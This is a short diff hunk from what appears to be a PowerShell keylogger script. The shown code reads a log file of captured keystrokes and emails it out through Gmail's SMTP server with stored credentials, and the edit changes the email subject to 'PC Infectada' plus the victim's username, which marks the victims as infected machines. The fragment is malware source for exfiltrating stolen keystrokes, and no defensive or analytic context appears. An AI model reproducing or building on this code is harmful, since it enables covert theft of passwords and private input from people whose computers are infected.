@@ -11,7 +11,7 @@ function KeyLogger($logFile="$env:temp/$env:UserName.log") {
 
   # email process
   $logs = Get-Content "$logFile"
-  $subject = "$env:UserName logs"
+  $subject = "PC Infectada: $env:UserName"
   $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
   $smtp.EnableSSL = $true
   $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
